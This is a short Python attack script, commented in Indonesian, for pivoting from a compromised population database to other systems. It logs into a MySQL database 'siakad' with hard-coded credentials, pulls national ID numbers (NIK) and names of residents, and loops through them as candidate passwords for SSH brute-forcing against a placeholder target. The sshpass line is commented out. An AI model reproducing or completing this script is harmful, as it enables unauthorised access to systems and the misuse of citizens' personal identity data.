#!/usr/bin/env python3
# Pivot dari NIK penduduk ke sistem lain
import mysql.connector, sys

conn = mysql.connector.connect(
    host="localhost", user="siak", password="siak123",
    database="siakad"
)

cursor = conn.cursor()
cursor.execute("SELECT nik,nama FROM penduduk LIMIT 1000")
niks = [row[0] for row in cursor.fetchall()]

# Brute force SSH/other systems dengan NIK sebagai password
for nik in niks[:100]:
    print(f"Testing NIK: {nik}")
    # subprocess.run(["sshpass", f"-p{nik}", "user@target", "whoami"])